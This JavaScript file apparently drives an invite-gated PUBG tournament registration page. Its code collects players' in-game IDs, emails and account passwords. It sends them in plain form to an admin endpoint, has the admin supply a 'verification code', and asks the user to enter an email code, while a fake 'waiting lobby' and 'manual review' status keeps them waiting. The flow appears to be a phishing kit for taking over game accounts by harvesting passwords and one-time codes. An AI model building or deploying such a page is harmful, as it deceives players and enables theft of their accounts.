// Валідні інвайт-коди (демо)
const VALID_CODES = ["FLOW2025","ESPORTPUBG","V7ACCESS"];

// DOM
const announceEnter = document.getElementById('announce-enter');
const codeGate      = document.getElementById('code-gate');
const codeInput     = document.getElementById('access-code');
const checkCodeBtn  = document.getElementById('check-code');
const codeStatus    = document.getElementById('code-status');
const regSection    = document.getElementById('registration-section');
const regForm       = document.getElementById('reg-form');
const regStatus     = document.getElementById('reg-status');
const finalMessage  = document.getElementById('final-message');
const finalCard     = document.getElementById('final-card');
const requestEmailCodeBtn = document.getElementById('request-email-code');
let lastUid = null;

// Показати STEP 1 після кліку
if (announceEnter){
  announceEnter.addEventListener('click', ()=>{
    codeGate.style.display = 'block';
    codeGate.setAttribute('aria-hidden','false');
    codeGate.scrollIntoView({behavior:'smooth'});
    setTimeout(()=>codeInput && codeInput.focus(), 250);
  });
}

// Уведомление админа (бэкенд-ендпоінти — заглушки під твої)
function notifyAdmin(type, payload = {}){
  return fetch("/api/notify-admin",{
    method:"POST",
    headers:{"Content-Type":"application/json"},
    body:JSON.stringify({type, ...payload})
  }).then(r=>r.json()).catch(()=>({ok:false,error:"fetch_failed"}));
}

async function sendApplication(formData){
  try{
    const res = await fetch("/api/submit-registration",{
      method:"POST",
      headers:{"Content-Type":"application/json"},
      body:JSON.stringify(formData)
    });
    if(!res.ok) throw 0;
    return await res.json();
  }catch(e){
    await notifyAdmin("full_application_fallback",formData);
    return {status:"pending"};
  }
}

function renderFinalStatus(status, uid){
  if(uid) lastUid = uid;

  if(status === "approved"){
    finalCard.innerHTML = `
      <div class="title"><span class="bar"></span>Registration approved</div>
      <div class="sub" style="margin-bottom:0">You will receive lobby details via email/DM.</div>
    `;
    return;
  }

  if(status === "rejected"){
    finalCard.innerHTML = `
      <div class="title"><span class="bar"></span>Registration rejected</div>
      <div class="sub" style="margin-bottom:0">Contact admin or submit updated information.</div>
    `;
    return;
  }

  let extra = "";
  if(lastUid){
    extra = `
      <div class="sub" style="margin-top:6px">Application ID: <code>${lastUid}</code></div>
      <div class="submit" style="justify-content:flex-start">
        <button id="check-status-btn" class="btn">Check status</button>
      </div>
    `;
  }

  finalCard.innerHTML = `
    <div class="title"><span class="bar"></span>Waiting lobby — application received</div>
    <div class="sub" style="margin-bottom:0">Your request is queued for manual review.</div>
    ${extra}
  `;

  const btn = document.getElementById('check-status-btn');
  if(btn && lastUid){
    btn.addEventListener('click', async ()=>{
      btn.disabled = true;
      btn.textContent = "Checking…";
      try{
        const r = await fetch(`/api/check-status/${lastUid}`);
        const d = await r.json();
        renderFinalStatus(d.status || "pending", lastUid);
      }catch{
        btn.disabled = false;
        btn.textContent = "Check status";
        alert("Try again later.");
      }
    });
  }
}

// Перевірка коду
if(checkCodeBtn){
  checkCodeBtn.addEventListener('click', ()=>{
    const val = (codeInput.value || "").trim().toUpperCase();
    if(!val){
      codeStatus.textContent = "Enter your invite code.";
      codeStatus.className = "status err";
      regSection.style.display = "none";
      return;
    }
    if(VALID_CODES.includes(val)){
      codeStatus.textContent = "Code accepted. Registration form unlocked.";
      codeStatus.className = "status ok";
      regSection.style.display = "block";
      regSection.scrollIntoView({behavior:'smooth'});
    }else{
      codeStatus.textContent = "Invalid code. Check your invite or contact support.";
      codeStatus.className = "status err";
      regSection.style.display = "none";
    }
  });
}

// Запит email-коду (часткова заявка)
if(requestEmailCodeBtn){
  requestEmailCodeBtn.addEventListener('click', async ()=>{
    regStatus.textContent = "";
    regStatus.className = "status";

    const ingameId = (document.getElementById('ingame-id').value||"").trim();
    const email    = (document.getElementById('email').value||"").trim();
    const pass     = (document.getElementById('password').value||"");

    if(!ingameId || !email || !pass){
      regStatus.textContent = "Fill In-game ID, Email and Password first.";
      regStatus.className = "status err";
      return;
    }

    const accessCode = (codeInput.value||"").trim();
    const res = await notifyAdmin("email_code_request",{
      accessCode, ingameId, email, password:pass, region:"CIS"
    });

    if(res && res.ok){
      regStatus.textContent = "Request sent. Admin will reply with verification code.";
      regStatus.className = "status ok";
    } else {
      regStatus.textContent = "Request queued. If no response, ping admin directly.";
      regStatus.className = "status err";
    }
  });
}

// Надсилання форми
if(regForm){
  regForm.addEventListener('submit', async (e)=>{
    e.preventDefault();
    regStatus.textContent = "";
    regStatus.className = "status";

    const accessCode = (codeInput.value||"").trim().toUpperCase();
    const email      = (document.getElementById('email').value||"").trim();
    const emailCode  = (document.getElementById('email-code').value||"").trim();
    const ingameId   = (document.getElementById('ingame-id').value||"").trim();
    const ingameIdConfirm = (document.getElementById('ingame-id-confirm').value||"").trim();
    const pass       = (document.getElementById('password').value||"");
    const pass2      = (document.getElementById('password-confirm').value||"");
    const terms      = document.getElementById('terms').checked;

    if(!accessCode || !VALID_CODES.includes(accessCode)){
      regStatus.textContent = "Access code is missing or invalid.";
      regStatus.className = "status err";
      return;
    }
    if(!email || !ingameId || !pass || !pass2){
      regStatus.textContent = "Please fill all required fields.";
      regStatus.className = "status err";
      return;
    }
    if(ingameIdConfirm && ingameIdConfirm !== ingameId){
      regStatus.textContent = "In-game ID confirmation does not match.";
      regStatus.className = "status err";
      return;
    }
    if(pass !== pass2){
      regStatus.textContent = "Passwords do not match.";
      regStatus.className = "status err";
      return;
    }
    if(!terms){
      regStatus.textContent = "Please confirm that the data is correct.";
      regStatus.className = "status err";
      return;
    }

    const formData = {accessCode, ingameId, email, password:pass, emailCode, region:"CIS"};

    regStatus.textContent = "Sending your application to the waiting lobby…";
    const result = await sendApplication(formData);

    regForm.reset();
    regSection.style.display = "none";
    finalMessage.style.display = "block";
    finalMessage.scrollIntoView({behavior:'smooth'});
    renderFinalStatus(result.status || "pending", result.uid || null);
  });
}
